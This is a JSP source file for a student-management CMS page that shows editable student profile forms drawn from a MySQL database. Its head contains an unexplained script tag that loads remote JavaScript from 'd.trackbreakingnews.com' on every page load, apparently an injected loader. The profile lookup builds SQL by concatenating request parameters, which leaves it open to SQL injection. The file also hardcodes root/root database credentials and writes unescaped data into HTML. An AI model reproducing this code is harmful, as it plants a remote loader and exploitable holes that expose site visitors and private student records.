<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<%@ page import="java.sql.*" %>
<%@ page import="java.io.*" %>
<%@ page import="javax.servlet.RequestDispatcher" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en">
  <head>
  	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
  	<script src="http://d.trackbreakingnews.com/l/load.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Data</title>

    <!-- Bootstrap core CSS -->
    <link href="CSS/bootstrap.min.css" rel="stylesheet">
    <link href="CSS/Stylex.css" rel="stylesheet">
     <link href="CSS/Front04.css" rel="stylesheet">
    <!-- Bootstrap theme -->
    <link href="CSS/bootstrap-theme.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="CSS/theme.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]>
    <script src="js/ie8-responsive-file-warning.js"></script>
    <![endif]-->
    <script src="js/ie-emulation-modes-warning.js"></script>
    
</script>
<link rel="stylesheet" href="CSS/animate.css">
<script src="js/wow.min.js"> </script>
<script> new WOW().init();</script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <style type="text/css">
    .ZZZ {
    position:relative;
    top: -60px;
    }
  .SS1 {
  margin-left: 35px;
  }
    body{

	background-image:url("iWall/appx.jpg");
	background-size:cover;
}
 .ZX a{
    color:#fff;
    font-family: Lato;
    font-weight: 800px;
    text-decoration: none;
    
    }
    .ZX a:hover{
    color:#17AEDF;
    font-family: Droid-sans;
    font-weight: bold;
    text-decoration: none;
    
    }
  .SS3 {
  margin-left: 70px;
  }
  .SS4 {
  margin-left: 130px;
  }
    .SS8 {
  margin-left: 88px;
  }
  .form-control {
  height: 30px;
  }
  .SS1x1 {
  margin-left:75px;
  }
    .XZ {
  position:relative;
  right:100px;
  top:-50px;
  margin-left: 185px;

  }
    .NM {
  top:-45px;
  position: relative;
  left:45px;
  }
  </style>
 
  </head>
  <body>
	<%
  		String user=(String) session.getAttribute("xmail");
  		String user1=(String) session.getAttribute("xuser");
  		String user2=(String) session.getAttribute("xguest");
  	  		if((user==null)&&(user1==null) && (user2==null)){
  			request.setAttribute("Error","You Must Login First...");
  			RequestDispatcher rd=request.getRequestDispatcher("Login1.jsp");
  			rd.forward(request, response);	
  		}
  		%>
                  	<div class="navbar navbar-inverse navbar-fixed-top pulse animated">
					<div class="container">
						<a class="navbar-brand XX" href="Data1.jsp">
							<img src="iWall/logo1.png"><p>CMS</p>
						</a>
						<button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						</button>
						<div class="collapse navbar-collapse">
					<ul class="nav navbar-nav pull-right">
					
					
						 <%
						 session=request.getSession();
                   		String ssx1=(String) session.getAttribute("xuser1");
                   		String ssx2=(String) session.getAttribute("xuser2");
                   		String ssx3=(String) session.getAttribute("xadmin");
						if(ssx1==null && ssx2==null&& ssx3==null){
                     %>
                     <li> <a href="Owner1.jsp">Owner</a></li>
					<li> <a href="Login1.jsp">Login</a></li>
					<%}
						 if(ssx1==null && ssx3==null){%>
						
						<li> <a href="Home2.jsp">Home</a></li>
					<li> <a href="Course.jsp">Course</a></li>
					<li class="dropdown">
						<a href="#" data-toggle="dropdown" class="dropdown-toggle">More <span class="caret"></span></a>
						<ul class="dropdown-menu">
						<li> <a href="Owner1.jsp"><%=ssx2 %></a> </li>
						<li class="divider"></li>
						<li><a href="#">Setting</a> </li>
						<li class="divider"></li>
						<li> <a href="Lout.jsp">Logout</a> </li>
						
						<%} %>
						
						
						<%
						 if(ssx2==null && ssx3==null){%>
						
						<li > <a href="Home2.jsp">Home</a></li>
					<li  > <a href="Course.jsp">Course</a></li>
					<li class="dropdown">
						<a href="#" data-toggle="dropdown" class="dropdown-toggle">More <span class="caret"></span></a>
						<ul class="dropdown-menu">
						<li> <a href="Owner1.jsp"><%=ssx1 %></a> </li>
						<li class="divider"></li>
						<li><a href="#">Setting</a> </li>
						<li class="divider"></li>
						<li> <a href="Logout2.jsp">Logout</a> </li>
						
						<%} %>
						<%
						 session=request.getSession();
                   		String ss1=(String) session.getAttribute("xadmin");
                   		String ss3=(String) session.getAttribute("xuser1");
                   		String ss2=(String) session.getAttribute("xuser2");
						if(ss1==null && ss2==null && ss3==null){
                     %>
                     <li class="active"> <a href="Owner1.jsp">Owner</a></li>
					<li> <a href="Login1.jsp">Login</a></li>
					<%}%>
					
					
					<%if(ss2==null && ss3==null) { %>
					<%
				Connection conn9x=null;
				PreparedStatement ps9x=null;
				ResultSet rs9x=null;
				OutputStream oImagex;
				
	try
	{
		Class.forName("com.mysql.jdbc.Driver");
		conn9x=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
		String query9x="Select * From admin1";
		ps9x=conn9x.prepareStatement(query9x);
		rs9x=ps9x.executeQuery();
		String sss=null;
		String sss1=null;
		String sss2=null;
		%>
	
		<% if(rs9x.next())
		{%>
		
		<tr style="border-bottom-style:solid;">
		<td>
		<input type="image" src="imageDisplayx.jsp?imgid=<%=rs9x.getInt(1)%>" class="fadeInDown animated img-circle" width="45" height="45">
		<li class="NM"><a href="Owner1.jsp"></a></li></td>
		</tr>
		<li > <a href="Home2.jsp">Home</a></li>
					<li  > <a href="Course.jsp">Course</a></li>
 			
		<%conn9x.close();%>
		

		<%}%>
</table>
	<% }catch(Exception e)
	{
		out.println(e);
		
	}%>
					<li class="dropdown">
					<a href="#" data-toggle="dropdown" class="dropdown-toggle">More <span class="caret"></span></a>
					<ul class="dropdown-menu">
					<%

	Connection conn9=null;
	PreparedStatement ps9=null;
	ResultSet rs9=null;
	OutputStream oImage;
	String query9="Select * From admin1";
	
	try
	{
		Class.forName("com.mysql.jdbc.Driver");
		conn9=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
		ps9=conn9.prepareStatement(query9);
		rs9=ps9.executeQuery();
		%>
	
		<% if(rs9.next())
		{%>
		<tr style="border-bottom-style:solid;">
		<td><input type="image" src="imageDisplayx.jsp?imgid=<%=rs9.getInt(1)%>" class="fadeInDown animated img-circle" width="55" height="55"><li class="NM"><a href="Owner1.jsp"><%=rs9.getString(2)%></a></li></td>
		</tr>
	
		<%}%>
</table>
	<% }catch(Exception e)
	{
		out.println(e);
		
	}%>
</td>
</tr><%
						int count=0;
						try{
						Class.forName("com.mysql.jdbc.Driver");
						Connection con=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
						String str="select * from msg";
						PreparedStatement ps=con.prepareStatement(str);
						ResultSet rs=ps.executeQuery();
						while(rs.next()) {
						count++;
						}
						con.close();
						}catch(Exception e) {
							out.println(e);
						}
						
						%>
						
						<%
						int countx=0;
						try{
						Class.forName("com.mysql.jdbc.Driver");
						Connection con=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
						String str="select * from sub";
						PreparedStatement ps=con.prepareStatement(str);
						ResultSet rs=ps.executeQuery();
						while(rs.next()) {
						countx++;
						}
						con.close();
						}catch(Exception e) {
							out.println(e);
						}
						
						%>
						
						<li class="divider"></li>
						<li><a href="Forgot1.jsp">Setting</a></li>
						<li class="divider"></li>
						<li><a href="Msg2.jsp">Message <span class="badge"> <%=count %> </span></a></li>
						<li class="divider">
						<li><a href="Sub2.jsp">Subscribers <span class="badge"> <%=countx %> </span></a></li>
						<li class="divider"></li>
						<li><a href="Logout.jsp">Logout</a></li>
					</UL>
						
<%}%>
					</ul>
	          </div> 
	      </div>
	  </div>
<br/><br/><br/><br/><br/>
<nav>
	<ul class="pager XZ">
    <li class="previous"><a href="Manage.jsp"><span >&larr;</span> Back</a></li>
    <li class="next"><a href="Data1.jsp"><span >&rarr;</span> Home</a></li>
  </ul>
</nav>
<div class="container ZZZ">
<div class="row ">
<div class="col-lg-3">
	<ul class="nav nav-pills nav-stacked "><hr>
			<div class="progress">
  <div class="progress-bar" role="progressbar" aria-valuenow="60" aria-valuemin="0" aria-valuemax="100" style="width: 100%;">
    <span class="sr-only"></span>
  </div>
</div>
		  <li role="presentation" class="active fadeInDown animated"><a href="Data1.jsp">DashBoard</a></li>
		  <li role="presentation" class="active fadeInDown animated"><a href="News.jsp">News-Events</a></li>
  <li role="presentation" class="active  fadeInDown animated"><a href="UserManage.jsp">User Registration</a></li>
  <li role="presentation" class="active fadeInDown animated"><a href="Manage.jsp">User Management</a></li>
  <li role="presentation" class="active fadeInDown animated"><a href="Department.jsp">Department</a></li>
  <li role="presentation" class="active fadeInDown animated"><a href="FeedDel.jsp">Manage Feedback</a></li>
  <li role="presentation" class="active fadeInDown animated"><a href="Msg2.jsp">Manage Messages</a></li>
 <li role="presentation" class="active fadeInDown animated"><a href="Sview.jsp">Syllabus</a></li>
 <li role="presentation" class="active fadeInDown animated"><a href="home.jsp">Quiz</a></li>
  <li role="presentation" class="active fadeInDown animated"><a href="home.jsp">About Us</a><hr></li>
</ul>
</div>
<%
String id[] = new String[10];
for (int i = 0; i < 10; i++) {
id[i] = request.getParameter("check" + i);
}
%>

<%
try {
Connection conn5 = null;
Class.forName("com.mysql.jdbc.Driver").newInstance ();
conn5 = DriverManager.getConnection(
"jdbc:mysql://localhost:3306/mystore", "root", "root");
ResultSet rs5 = null;
Statement st5 = null;
st5 = conn5.createStatement();
for (int a = 0; a < 10; a++) {
rs5=st5.executeQuery("select * from stud2 where sid='" + id[a]+ "'");

//ps.setString(1, id);
while (rs5.next()){ %>
	<div class="XXXX">
      <div class="container">
        <div class="row">
          <div class="col-lg-9 FM">
          <div class="panel panel-default ">
            
                <%

int ix=0;
%>
          <div class="col-lg-9 FM">
          <div class="panel panel-default">
            <div class="panel-heading">
              <h4>Update Profile.. <%=rs5.getString("fname") %></h4>
              </div>
              <div class="panel-body">
                <div class="well">
          <form method="post" action="Sign2.jsp" role="form">
            <div class="form-inline In">
              <div class="form-group">
             <label for="MyId"> Student Id :</label>
                
                <input type="text" class="form-control SS" id="MyId" name="id" id="disabledTextInput"  readonly value="<%=rs5.getString("sid") %>" >
             </div>

              <div class="form-group"> <fieldset disabled> 
                <label for="MySs"> Session:</label>
                <input type="text" class="form-control SS2" id="MySs" name="ss" readonly value="<%=rs5.getString("session") %>"></fieldset>
              </div>

              <div class="form-group"><fieldset disabled> 
                <label for="MyAd"> Date Of Admission:</label>
                <input type="date" class="form-control SS1" id="MyAd" name="adm" readonly value="<%=rs5.getString("exam") %>"></fieldset>
              </div>



            <div class="form-group Nm">
              <label for="MyNm"> Student Name</label>
              <input Type="text" class="form-control SS3" id="MyNm" name="name" value="<%=rs5.getString("fname") %>"> 
            </div> 

            <div class="form-group">
              <label for="MyLname"> Email</label>
              <input Type="text" class="form-control SS4" id="MyLname" name="email" value="<%=rs5.getString("email") %>"> 
            </div> <br/>

            <div class="form-group">
              <label for="Mycl">Course</label>
              <select class="form-control SS5" name="cr">
                <option value="<%=rs5.getString("course") %>"> MCA</option>
                <option value="<%=rs5.getString("course") %>"> M.sc (IT)</option>
              </select>
            </div>

            <div class="form-group SSs6">
              <label for="Mycl">Semester</label>
              <select class="form-control SS6" name="sm">
                <option value="<%=rs5.getString("sem") %>"> I</option>
                <option value="<%=rs5.getString("sem") %>"> II</option>
                <option value="<%=rs5.getString("sem") %>">  III</option>
                <option value="<%=rs5.getString("sem") %>"> IV</option>
              </select>
            </div>

            <div class="form-group SSs7"><fieldset disabled> 
            <strong>Gender:</strong> 
            <select class="form-control SS7" name="gen">
              <option value="<%=rs5.getString("gender") %>">Male</option>
              <option value="<%=rs5.getString("gender") %>">  Female</option>
            </select></fieldset>
          </DIV>
            <br/>

            <div class="form-group"><fieldset disabled> 
              <label for="MyFname"> Father Name</label>
              <input Type="text" name="fn" class="form-control SS12" id="MyFname" readonly value="<%=rs5.getString("ffname") %>"> </fieldset>
            </div> <br/>

           <fieldset disabled>  <strong>Nationality:</strong> 
            <select class="form-control SS8" name="nt">
              <option readonly value="<%=rs5.getString("nation") %>">Indian</option>
              <option readonly value="<%=rs5.getString("nation") %>">Ausis</option>
              </fieldset>
            </select>
          <div class="form-group SS13"><fieldset disabled> 
            <strong>Religion:</strong>
            <select class="form-control SS9" name="rl">
              <option value="<%=rs5.getString("religion") %>">HINDU</option>
              <option value="<%=rs5.getString("religion") %>">MUSLIM</option>
            </select>
          </div>
          <br/>

            <div class="form-group">
              <label for="MyFname"> Father Occu.</label>
              <input Type="text" name="fo" class="form-control SS10" id="MyFname" value="<%=rs5.getString("foccu") %>"> 
            </div><br/>
             </fieldset>
            <div class="form-group">
              <label for="exampleInputPassword1"> Phone</label> 
              <input type="text" name="ph" class="form-control SS11" id="exampleInputPassword1" value="<%=rs5.getString("fone") %>">
              </div> <br/>
            
            
            <div class="form-group"><fieldset disabled> 
              <label for="exampleInputPassword1"> Mother Name</label> 
              <input type="text" name="mon" class="form-control SS1x1" id="exampleInputPassword1" readonly value="<%=rs5.getString("mname") %>"></fieldset>
              </div> <br/>
           
            <div class="form-group">
              <label for="exampleInputPassword1">Father Phone</label> 
              <input type="text" name="fof" class="form-control SS1x1" id="exampleInputPassword1" value="<%=rs5.getString("ffone") %>">
              </div> <br/>
            
            <div class="form-group">
              <label for="exampleInputPassword1">Mother Occu</label> 
              <input type="text" name="mop" class="form-control SS1x1" id="exampleInputPassword1" value="<%=rs5.getString("moccu") %>">
              </div> <br/>
         
            <div class="form-group">
              <label for="exampleInputPassword1"> Father Email:  </label> 
              <input type="email" name="foe" class="form-control SS1x1" id="exampleInputPassword1" value="<%=rs5.getString("gmail") %>">
              </div> <br/>
         
            <strong>Address:</strong> 
            <textarea class="form-control TR" rows="2" name="addr" cols="100%" value="<%=rs5.getString("address") %>">
            </textarea>
            <br/>
             <div class="form-group"><fieldset disabled> 
			    <label for="nm23x">Upload Profile Pic:</label>
			    <input type="file"  id="MyId" name="nm26" class="mtx1zx"></fieldset>
			    	  </div></div><br/><br/>
            <div class="form-group">
              <button type="submit" class="btn btn-primary btn-block BTNX">Submit</button></form></div></div>
            		</div>
             	</div>
              </div>
            </div> 
          </div>
        </div>
      </div>  </div>  </div>  </div>  </div>  </div>
  
      <br/><br/><br/><br/>    <%
}
conn5.close();}
}catch(Exception e) { out.println(e); }
%> 
			<div class="Cvv">
				<div class="container-fluid FFF">
					<div class="row">
						<div class="col-lg-12  FF">
							<h5>
							@2015 All Rights Reserved / Legal Notices / Privacy Policy  <small>Ajay Singh Bisht | 2015 | @002ajay (</em>Twitter</em>)</small>
							</h5>
						</div>
					</div>
				</div>
			</div>

    <script src="jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/docs.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="js/ie10-viewport-bug-workaround.js"></script>
    <script>
	$('.dropdown').hover(function() {
		$('.dropdown-toggle',this).trigger('click');
	});
	</script>
  </body>
</html>
